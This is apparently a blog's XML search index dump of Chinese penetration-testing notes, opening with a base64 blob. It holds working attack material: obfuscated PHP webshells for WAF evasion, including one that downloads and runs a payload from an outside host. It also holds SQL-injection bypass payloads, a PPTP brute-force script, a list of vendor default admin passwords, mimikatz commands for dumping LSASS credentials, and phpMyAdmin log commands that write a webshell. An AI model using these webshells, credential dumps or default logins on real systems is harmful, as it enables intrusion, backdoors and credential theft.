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]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>内网通道</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP常见绕过WAF方法汇总]]></title>
    <url>%2Farchives%2F3f60c38c.html</url>
    <content type="text"><![CDATA[常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰 &lt;?php $a = base64_decode(&quot;YXNzYXNz+00000____&quot;); $a = substr_replace($a,&quot;ert&quot;,3); $a($_POST[&apos;x&apos;]); ?&gt; ucwords() ucfirst() trim() substr_replace() substr() strtr() strtoupper() strtolower() strtok() str_rot13() chr() gzcompress()、gzdeflate()、gzencode() gzuncompress()、gzinflate()、gzdecode() base64_encode() base64_decode() pack() unpack()自写函数 利用assert() &lt;?php function test($a){ $a($_POST[&apos;x&apos;]); } test(assert); ?&gt;回调函数&lt;?php call_user_func(assert,array($_POST[x])); ?&gt; call_user_func_array() array_filter() array_walk() array_map() registregister_shutdown_function() register_tick_function() filter_var() filter_var_array() uasort() uksort() array_reduce() array_walk() array_walk_recursive() forward_static_call_array()类利用魔术方法、析构函数destruct()，construct()&lt;?php class test { public $a = &apos;&apos;; function __destruct(){ assert(&quot;$this-&gt;a&quot;); } } $b = new test; $b-&gt;a = $_POST[&apos;x&apos;]; ?&gt;利用外部文件利用curl, fsockopen等发起网络请求再结合file_get_contents&lt;?php error_reporting(0); session_start(); header(&quot;Content-type:text/html;charset=utf-8&quot;);if(empty($_SESSION[&apos;api&apos;])) $_SESSION[&apos;api&apos;]=substr(file_get_contents(sprintf(&apos;%s?%s&apos;,pack(&quot;H*&quot;, &apos;687474703a2f2f7777772e77326e31636b2e636f6d2f7368656c6c2f312e6a7067&apos;),uniqid())),3649); @preg_replace(&quot;~(.*)~ies&quot;,gzuncompress($_SESSION[&apos;api&apos;]),null); ?&gt;无字符特征马编码、异或、自增&lt;?php $_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;; $__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;; $___=$$__; $_($___[_]); // assert($_POST[_]); ?&gt;特殊请求头利用getallheaders()&lt;?php $cai=getallheaders()[&apos;cai&apos;]; $dao=getallheaders()[&apos;dao&apos;]; if($cai!=&quot;&quot; and $dao!=&quot;&quot;){ $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao))); } header(&apos;HTTP/1.1 404 Not Found&apos;); ?&gt;全局变量利用getenv()，arrag_flip()，get_defined_vars()，session_id()import requests url = &apos;http://localhost/?code=eval(hex2bin(session_id(session_start())));&apos; payload = &quot;phpinfo();&quot;.encode(&apos;hex&apos;) cookies = { &apos;PHPSESSID&apos;:payload } r = requests.get(url=url,cookies=cookies) print r.contentPHP混淆加解密以phpjiami为例就是将函数名、变量名全部变成&quot;乱码&quot;，且改动任意一个地方，都将导致文件不能运行。具体可访问：https://www.phpjiami.com/webshell检测方法(部分)机器学习检测webshell：比如混淆度、最长单词、重合指数、特征、压缩比等 动态检测（沙箱） 基于流量模式检测webshell：agent 逆向算法+静态匹配检测webshell：比如D盾webshell查杀 根据文件入度出度来检测参考:]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Php特性</category>
      </categories>
      <tags>
        <tag>Waf绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无关键字进行SQL注入]]></title>
    <url>%2Farchives%2F67b2bdd.html</url>
    <content type="text"><![CDATA[在某公众号看到的,做个记录 替换空格的字符: 09 0A 0B 0C 0D A0 20 替换空格 数据库特性: /!50000select/注释等方法绕过 黑名单过滤: waf大致分为，软waf，硬件waf，云waf。他们的拦截方式可能都不一样，但是大体规则大致相同，也就是黑名单，白名单方式。 比如下面这种软waf是基于黑名单的，发现大部分常用函数都被过滤了: 基本bypass waf的思路 无非就是 空格绕过，注释，内联注释，%0a~,这种形式的baypass思路。这种大家去看sqlmap的tamper源码即可。今天就讲一些不常见的bypass思路。 常规获取表名姿势是:通过information_schema，SCHEMATA，TABLES 等敏感词获取表名,但是一般情况下都被过滤了 mysql 自定义函数绕过:select * from user where id=aaa()mysql 特定的内置函数绕过:payload： ?id=1%20and%20polygon(id)类似的函数还有: linestring,multipoint,multilinestring,multipolygon 根据此文章做了一下记录和调整的笔记:无关键字进行SQL注入]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反弹提权姿势集合&&部分免杀技巧]]></title>
    <url>%2Farchives%2F5d509f57.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>外网渗透</category>
        <category>反弹提权</category>
      </categories>
      <tags>
        <tag>反弹提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win杀软进程在线对比-提权辅助]]></title>
    <url>%2Farchives%2Fe3266f5b.html</url>
    <content type="text"><![CDATA[前言 非常感谢原作者的数据,此功能可以提高提权过程中需要匹配的杀软进程的效率,在原作者的基础上修改了正则. 用法: 通过CMD,tasklist /svc,将进程信息复制粘贴到站点文本框即可列出杀软进程,方便后续绕过与提权,入有不全面,欢迎留言补充~ 链接:Win杀软进程对比辅助&amp;&amp;提权辅助]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PPTP口令爆破]]></title>
    <url>%2Farchives%2F38f7c93b.html</url>
    <content type="text"><![CDATA[PPTP服务器默认开放1723端口1、PPTP brute forcer源代码： https://github.com/BlackArch/thc-pptp-bruterkali默认支持通过字典爆破的命令如下： cat wordlist | thc-pptp-bruter -u zhaodg &lt;IP&gt;2、编写python脚本实现有些设备的PPTP无法使用PPTP brute forcer进行爆破 于是尝试使用python调用pptpsetup实现 通过os.popen执行命令，测试代码如下： import os def test_vpn(ip,name,password): command = &apos;pptpsetup --create testvpn --server &apos;+ip+&apos; --username &apos;+name+&apos; --password &apos;+password+&apos; --encrypt --start&apos; print command vpn_status = os.popen(command).read() print vpn_status if __name__ == &apos;__main__&apos;: test_vpn(&apos;5x.xxx.xxx.xx2&apos;,&apos;zhaodg&apos;,&apos;oZ7iFk25&apos;)测试过程中出现bug： 如果登录成功，进程pptp不会退出，导致脚本阻塞，无法获得回显 只有结束进程pptp后，才能获得回显 所以这里需要使用子进程的方式实现： 子进程执行pptpsetup命令，父进程不等待 随之产生新的问题： 如何获得子进程的结果，判断是否登录成功 这里选择一个简单直接的方法： 等待10秒，然后执行ifconfig，如果登录成功，会产生新的网卡设备ppp0，否则，当前用户名口令错误 登录成功后，选择清理进程，执行命令： pkill pptp清除连接信息：pptpsetup --delete testvpn]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>密码爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络设备的默认密码(交换机、路由器、安全设备)]]></title>
    <url>%2Farchives%2Ffcea265e.html</url>
    <content type="text"><![CDATA[网络设备的默认密码天融信防火墙:不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119天融信防火墙:不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火:墙需要证书（最好用IE浏览器登录）登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666深信服防火墙:（注安全设备管理地址不是唯一的） https://10.251.251.251 https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430启明星辰:https://10.1.5.254:8889 用户名：admin 密码：bane@7766 https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900juniper:登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreenCisco:登录地址:https://192.168.0.1 用户名:admin 密码:ciscoHuawei:登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123H3C:登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430绿盟IPS:https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效网神防火墙GE1口:https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220深信服VPN：51111端口 delanrecover华为VPN：账号：root 密码：mduadmin华为防火墙：admin Admin@123 eudemon eudemon Juniper防火墙： netscreen netscreen huawei/huawei@123 admin/huawei@123 cisco cisco/cisco 迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)山石:192.168.1.1 默认的管理账号为hillstone，密码为hillstone安恒的明御防火墙:admin/adminadmin某堡垒机:shterm/shterm天融信的vpn:test/123456]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
      <tags>
        <tag>默认密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL_Sever手工注入及技术总结]]></title>
    <url>%2Farchives%2Fd0f5ccf3.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞挖掘</category>
        <category>Sql注入</category>
      </categories>
      <tags>
        <tag>Sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见未授权访问漏洞总结]]></title>
    <url>%2Farchives%2F15af7f29.html</url>
    <content type="text"><![CDATA[常见的未授权访问漏洞：Redis 未授权访问漏洞MongoDB 未授权访问漏洞Jenkins 未授权访问漏洞Memcached 未授权访问漏洞JBOSS 未授权访问漏洞VNC 未授权访问漏洞Docker 未授权访问漏洞ZooKeeper 未授权访问漏洞Rsync 未授权访问漏洞Atlassian Crowd 未授权访问漏洞CouchDB 未授权访问漏洞Elasticsearch 未授权访问漏洞Hadoop 未授权访问漏洞Jupyter Notebook 未授权访问漏洞原文:常见的未授权访问漏洞]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Pythton渗透测试工具库总纲]]></title>
    <url>%2Farchives%2Ff71d256c.html</url>
    <content type="text"><![CDATA[漏洞及渗透练习平台：WebGoat漏洞练习平台：https://github.com/WebGoat/WebGoatwebgoat-legacy漏洞练习平台:https://github.com/WebGoat/WebGoat-Legacyzvuldirll漏洞练习平台：https://github.com/710leo/ZVulDrillvulapps漏洞练习平台：https://github.com/Medicean/VulAppsdvwa漏洞练习平台：https://github.com/RandomStorm/DVWA数据库注入练习平台 ：https://github.com/Audi-1/sqli-labs用node编写的漏洞练习平台，like OWASP Node Goat：https://github.com/cr0hn/vulnerable-nodeW12Scan：一款功能强大的网络安全资产扫描引擎https://github.com/boy-hack/w12scanRuby编写的一款工具，生成含漏洞的虚拟机：https://github.com/cliffe/secgen花式扫描器 ：Nmap端口扫描器：https://github.com/nmap/nmap本地网络扫描器：https://github.com/SkyLined/LocalNetworkScanner子域名扫描器：https://github.com/lijiejie/subDomainsBrute https://github.com/aboul3la/Sublist3r https://github.com/TheRook/subbrute https://github.com/infosec-au/altdns https://github.com/ring04h/wydomain(猪猪侠开发)linux漏洞扫描：https://github.com/future-architect/vuls基于端口扫描以及关联CVE:https://github.com/m0nad/HellRaiser漏洞路由扫描器：https://github.com/jh00nbr/Routerhunter-2.0迷你批量信息泄漏扫描脚本：https://github.com/lijiejie/BBScanWaf类型检测工具：https://github.com/EnableSecurity/wafw00f服务器端口弱口令扫描器：https://github.com/wilson9x1/fenghuangscanner_v3Fox-scan扫描器：https://github.com/fengxuangit/Fox-scan/信息搜集工具 :FuzzScanner：信息搜集开源小工具https://github.com/TideSec/FuzzScanner社工收集器：https://github.com/n0tr00t/SregGithub信息搜集：https://github.com/sea-god/gitscangithub Repo信息搜集工具：https://github.com/metac0rtex/GitHarvester信息探测及扫描工具：https://github.com/darryllane/Bluto内部网络信息扫描器：https://github.com/sowish/LNScan一款开源关键词URL采集工具https://github.com/super-l/superl-url远程桌面登录扫描器：https://github.com/linuz/Sticky-Keys-Slayer网络基础设施渗透工具https://github.com/SECFORCE/spartaSNMAP密码破解:https://github.com/SECFORCE/SNMP-BruteJSFinder_js抓取工具:https://github.com/Threezh1/JSFinderWEB：webshell大合集：https://github.com/tennc/webshell渗透以及web攻击脚本：https://github.com/brianwrf/hackUtilsweb渗透小工具大合集：https://github.com/rootphantomer/hacktoolsfor_meXSS数据接收平台：https://github.com/firesunCN/BlueLotus_XSSReceiverXSS与CSRF工具：https://github.com/evilcos/xssorxss多功能扫描器：https://github.com/shawarkhanethicalhacker/BruteXSSweb漏洞扫描器:https://github.com/andresriancho/w3afWEB漏洞扫描器：https://github.com/sullo/nikto渗透常用小工具包：https://github.com/leonteale/pentestpackageweb目录扫描器:https://github.com/maurosoria/dirsearchWhatDir 一款多线程Web目录扫描工具https://github.com/Ekultek/WhatDirweb向命令注入检测工具：https://github.com/stasinopoulos/commix自动化SQL注入检查工具：https://github.com/epinna/tplmapSSL扫描器：https://github.com/rbsec/sslscan安全工具集合：https://github.com/codejanus/ToolSuiteapache日志分析器：https://github.com/mthbernardes/ARTLASphp代码审计工具：https://github.com/pwnsdx/BadCodeweb指纹识别扫描：https://github.com/urbanadventurer/whatweb检查网站恶意攻击：https://github.com/ciscocsirt/malspiderwordprees漏洞扫描器：https://github.com/wpscanteam/wpscan固件漏洞扫描器：https://github.com/misterch0c/firminator_backend数据库注入工具https://github.com/sqlmapproject/sqlmapWeb代理：https://github.com/zt2/sqli-hunter新版中国菜刀：https://github.com/Chora10/Cknifegit泄露利用EXP：https://github.com/lijiejie/GitHack浏览器攻击框架：https://github.com/beefproject/beef自动化绕过WAF脚本：https://github.com/khalilbijjou/WAFNinja https://github.com/owtf/wafbypasser一款开源WAF：https://github.com/SpiderLabs/ModSecurityhttp命令行客户端：https://github.com/jkbrzt/httpie浏览器调试利器：https://github.com/firebug/firebugDISCUZ漏洞扫描器：https://github.com/code-scan/dzscan自动化代码审计工具https://github.com/wufeifei/cobra浏览器攻击框架：https://github.com/julienbedard/browsersploittomcat自动后门部署：https://github.com/mgeeky/tomcatWarDeployer网络空间指纹扫描器：https://github.com/nanshihui/Scan-Tburpsuit之J2EE扫描插件：https://github.com/ilmila/J2EEScanwindows域渗透工具：mimikatz明文注入：https://github.com/gentilkiwi/mimikatzPowershell渗透库合集：https://github.com/PowerShellMafia/PowerSploitPowershell tools合集：https://github.com/clymb3r/PowerShellpowershell的mimikittenz:https://github.com/putterpanda/mimikittenz域渗透教程:https://github.com/l3m0n/pentest_studyFuzz:Web向Fuzz工具https://github.com/xmendez/wfuzzHTTP暴力破解，撞库攻击脚本https://github.com/lijiejie/htpwdScan漏洞利用及攻击框架：msf框架：https://github.com/rapid7/metasploit-frameworkpocsscan攻击框架：https://github.com/erevus-cn/pocscanPocsuite攻击框架:https://github.com/knownsec/PocsuiteBeebeeto攻击框架：https://github.com/n0tr00t/Beebeeto-framework漏洞POC&amp;EXP:ExploitDB官方git版本:https://github.com/offensive-security/exploit-databasephp漏洞代码分析：https://github.com/80vul/phpcodzCVE-2016-2107:https://github.com/FiloSottile/CVE-2016-2107CVE-2015-7547 POC：https://github.com/fjserna/CVE-2015-7547JAVA反序列化POC生成工具:https://github.com/frohoff/ysoserialJAVA反序列化EXP:https://github.com/foxglovesec/JavaUnserializeExploitsJenkins CommonCollections EXP:https://github.com/CaledoniaProject/jenkins-cli-exploitCVE-2015-2426 EXP (windows内核提权):https://github.com/vlad902/hacking-team-windows-kernel-lpeuse docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):https://github.com/hxer/vulnappphp7缓存覆写漏洞Demo及相关工具:https://github.com/GoSecure/php7-opcache-overrideXcodeGhost木马样本:https://github.com/XcodeGhostSource/XcodeGhost中间人攻击及钓鱼中间人攻击框架:https://github.com/secretsquirrel/the-backdoor-factory https://github.com/secretsquirrel/BDFProxy https://github.com/byt3bl33d3r/MITMfInject code, jam wifi, and spy on wifi users:https://github.com/DanMcInerney/LANs.py中间人代理工具:https://github.com/intrepidusgroup/mallorywifi钓鱼:https://github.com/sophron/wifiphisher密码破解：密码破解工具:https://github.com/shinnok/johnny本地存储的各类密码提取利器:https://github.com/AlessandroZ/LaZagne二进制及代码分析工具：二进制分析工具https://github.com/devttys0/binwalk系统扫描器https://github.com/quarkslab/binmaprp:https://github.com/0vercl0k/rpWindows Exploit Development工具https://github.com/lillypad/badger二进制静态分析工具（python）:https://github.com/bdcht/amocoPython Exploit Development Assistance for GDB:https://github.com/longld/peda对BillGates Linux Botnet系木马活动的监控工具https://github.com/ValdikSS/billgates-botnet-tracker木马配置参数提取工具:https://github.com/kevthehermit/RATDecodersShellphish编写的二进制分析工具（CTF向）:https://github.com/angr/angr针对python的静态代码分析工具:https://github.com/yinwang0/pysonar2一个自动化的脚本（shell）分析工具，用来给出警告和建议:https://github.com/koalaman/shellcheck基于AST变换的简易Javascript反混淆辅助工具:https://github.com/ChiChou/etacsufboEXP编写框架及工具：二进制EXP编写工具:https://github.com/t00sh/rop-toolCTF Pwn 类题目脚本编写框架:https://github.com/Gallopsled/pwntoolsan easy-to-use io library for pwning development:https://github.com/zTrix/zio跨平台注入工具:https://github.com/frida/frida哈希长度扩展攻击EXP：https://github.com/citronneur/rdpy隐写：隐写检测工具https://github.com/abeluck/stegdetect各类安全资料:data_hacking合集:https://github.com/ClickSecurity/data_hackingmobile-security-wiki:https://github.com/exploitprotocol/mobile-security-wiki书籍《reverse-engineering-for-beginners》:https://github.com/veficos/reverse-engineering-for-beginners一些信息安全标准及设备配置:https://github.com/luyg24/IT_securityAPT相关笔记:https://github.com/kbandla/APTnotesKcon资料:https://github.com/knownsec/KCon《DO NOT FUCK WITH A HACKER》:https://github.com/citypw/DNFWAH各类安全脑洞图：https://github.com/phith0n/Mind-Map信息安全流程图：https://github.com/SecWiki/sec-chart/ tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428各类CTF资源近年ctf writeup大全:https://github.com/ctfs/write-ups-2016 https://github.com/ctfs/write-ups-2015 https://github.com/ctfs/write-ups-2014fbctf竞赛平台Demo:https://github.com/facebook/fbctfctf Resources:https://github.com/ctfs/resourcesctf及黑客资源合集:https://github.com/bt3gl/My-Gray-Hacker-Resourcesctf和安全工具大合集:https://github.com/zardus/ctf-toolsctf向 python工具包https://github.com/P1kachu/v0lt各类编程资源:大礼包（什么都有）:https://github.com/bayandin/awesome-awesomenessbash-handbook:https://github.com/denysdovhan/bash-handbookpython资源大全:https://github.com/jobbole/awesome-python-cngit学习资料:https://github.com/xirong/my-git安卓开源代码解析https://github.com/android-cn/android-open-projectpython框架，库，资源大合集:https://github.com/vinta/awesome-pythonJS 正则表达式库（用于简化构造复杂的JS正则表达式）:https://github.com/VerbalExpressions/JSVerbalExpressionsPython：python 正则表达式库（用于简化构造复杂的python正则表达式）:https://github.com/VerbalExpressions/python任务管理以及命令执行库:https://github.com/pyinvoke/invokepython exe打包库:https://github.com/pyinstaller/pyinstallerVeil-Evasion免杀项目：https://github.com/Veil-Framework/Veil-Evasionpy3 爬虫框架:https://github.com/orf/cyborg一个提供底层接口数据包编程和网络协议支持的python库:https://github.com/CoreSecurity/impacket python requests 库:https://github.com/kennethreitz/requestspython 实用工具合集:https://github.com/mahmoud/boltonspython爬虫系统:https://github.com/binux/pyspider科学上网：科学上网工具https://github.com/XX-net/XX-Net福利：微信自动抢红包动态库https://github.com/east520/AutoGetRedEnv微信抢红包插件（安卓版）https://github.com/geeeeeeeeek/WeChatLuckyMoneyhardsed神器:https://github.com/yangyangwithgnu/hardseed甲方安全工程师生存指南web索引及日志搜索工具：https://github.com/thomaspatzke/WASE开源日志采集器：https://github.com/wgliang/logcool扫描CS结构的web debugerhttps://github.com/Kozea/wdb恢复sqlite数据库删除注册信息：https://github.com/aramosf/recoversqlite/gps欺骗检测工具:https://github.com/zxsecurity/gpsnitch应急处置响应框架:https://github.com/biggiesmallsAG/nightHawkResponse web安全开发指南:https://github.com/FallibleInc/security-guide-for-developers各个知名厂商漏洞测试报告模板：https://github.com/juliocesarfort/public-pentesting-reports linux下恶意代码检测包： https://github.com/rfxn/linux-malware-detect操作系统运行指标可视化框架：https://github.com/facebook/osquery恶意代码分析系统：https://github.com/cuckoosandbox/cuckoo定期搜索及存储web应用：https://github.com/Netflix/Scumblr事件响应框架：https://github.com/google/grr综合主机监控检测平台：https://github.com/ossec/ossec-hids分布式实时数字取证系统：https://github.com/mozilla/migMicrosoft &amp; Unix 文件系统及硬盘取证工具：https://github.com/sleuthkit/sleuthkit蜜罐：SSH蜜罐：https://github.com/desaster/kippo蜜罐集合资源：https://github.com/paralax/awesome-honeypots kippo进阶版蜜罐：https://github.com/micheloosterhof/cowrieSMTP 蜜罐：https://github.com/awhitehatter/mailoneyweb应用程序蜜罐：https://github.com/mushorg/glastopf数据库蜜罐：https://github.com/jordan-wright/elastichoneyweb蜜罐：https://github.com/atiger77/Dionaea远控：用gmail充当C&amp;C服务器的后门https://github.com/byt3bl33d3r/gcat开源的远控：https://github.com/UbbeLoL/uRATc#远控：https://github.com/hussein-aitlahcen/BlackHole原文 Python工具库安全工具总纲]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[两步完成利用procdump64+mimikatz获取win用户密码]]></title>
    <url>%2Farchives%2Ff86fa73d.html</url>
    <content type="text"><![CDATA[两步完成利用procdump64+mimikatz获取win用户密码 使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exe procdump64.exe -accepteula -ma lsass.exe lsass.dmp(注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit(注:必须使用管理员权限) 成功获取明文密码]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>提权(系统级)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Phpmyadmin_getshell]]></title>
    <url>%2Farchives%2F694daf10.html</url>
    <content type="text"><![CDATA[查看是否有写文件权限show global variables like &apos;%secure%&apos;;查看日志文件存放路径及开启SHOW GLOBAL VARIABLES LIKE &apos;%general_log%&apos; set global general_log = ONgetshell 三大命令:set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; //绝对路径 SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>外网渗透</category>
        <category>提权(WEB)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Structs全版本漏洞利用总结]]></title>
    <url>%2Farchives%2F91cb19b5.html</url>
    <content type="text"><![CDATA[前言Structs2框架目前已知的漏洞编号如下：S2-005 S2-009 S2-016 (含S2-013) S2-019 S2-020 S2-021 S2-032 S2-037（含S2-033) DevMode S2-045 S2-046 S2-048 S2-052 S2-055 S2-057 目前公开的工具，唯独缺失052和055的利用。S2-055比较特殊，严格来说055本身无问题，问题出在其使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。也就是说S2-055本质上是Jackson反序列化，其CVE编号为CVE-2017-7525。本文将对缺失的S2-055以及S2-052做漏洞复现. 原文:struct 2 全版本漏洞总结]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[彻底理解Windows认证 - 议题解读]]></title>
    <url>%2Farchives%2F58b20026.html</url>
    <content type="text"><![CDATA[彻底理解Windows认证 - 议题解读:原文:彻底理解window认证]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「disablefunc绕过」一种绕过php disablefunc的方法复现]]></title>
    <url>%2Farchives%2F2ea7b633.html</url>
    <content type="text"><![CDATA[前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好的同名函数。 环境搭建ubuntu+apache2+php7.2 配置/etc/php/7.2/apache2/php.ini 设置disable_functions = system,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,然后重启apache2 服务器 这样就能把system禁用了 然后在网站的根目录上放一个shell.php &lt;?php @eval($_GET[&apos;fz41&apos;]);?&gt;访问shell.php可以正常执行php的代码，不能执行系统函数。 测试访问http://192.168.44.139/shell.php?fz41=phpinfo();可以看见phpinfo()的信息 访问http://192.168.44.139/shell.php?fz41=system(ls);没有任何回显环境配置成功，我们的任务就是通过劫持函数的方法来绕过这个disable_functions 